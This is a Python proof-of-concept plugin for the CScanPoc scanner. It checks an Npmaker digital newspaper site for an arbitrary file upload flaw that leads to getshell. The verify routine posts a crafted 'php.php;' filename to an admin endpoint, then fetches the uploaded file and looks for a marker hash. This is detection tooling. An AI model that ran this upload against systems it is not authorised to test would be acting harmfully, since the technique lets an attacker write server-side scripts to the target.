# coding: utf-8

from CScanPoc.thirdparty import requests,hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re
hh = hackhttp.hackhttp()

class Vuln(ABVuln):
    vuln_id = 'Npmaker_0002' # 平台漏洞编号，留空
    name = 'Npmaker数字报 任意上传getshell(需要解析漏洞)' # 漏洞名称
    level = VulnLevel.MED # 漏洞危害级别
    type = VulnType.FILE_UPLOAD # 漏洞类型
    disclosure_date = '2013-07-26'  # 漏洞公布时间
    desc = '''
        Npmaker数字报 任意上传getshell(需要解析漏洞)
    ''' # 漏洞描述
    ref = 'https://www.2cto.com/article/201307/231014.html' # 漏洞来源
    cnvd_id = 'Unkonwn' # cnvd漏洞编号
    cve_id = 'Unkonwn' #cve编号
    product = 'Npmaker'  # 漏洞应用名称
    product_version = 'Unkonwn'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '19347441-1594-48d5-808c-f1f78a205754'
    author = '国光'  # POC编写者
    create_date = '2018-05-15' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            url=arg+"/www/index.php?mod=admin&con=onepage&act=addpost"
            post="onepage%5Bname%5D=c4ca4238a0b923820dcc509a6f75849b&onepage%5Bfilename%5D=php.php;&onepage%5Bcontent%5D=&id=&onepage_submit=%CC%E1%BD%BB"
            code,head,res,errcode,_=hh.http(url,post)
            shell_url=arg+"shtml/php.php%3B.shtml"
            code1,head,res1,errcode,_=hh.http(shell_url)
            
            if code1==200 and 'c4ca4238a0b923820dcc509a6f75849b' in res1:
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target,name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()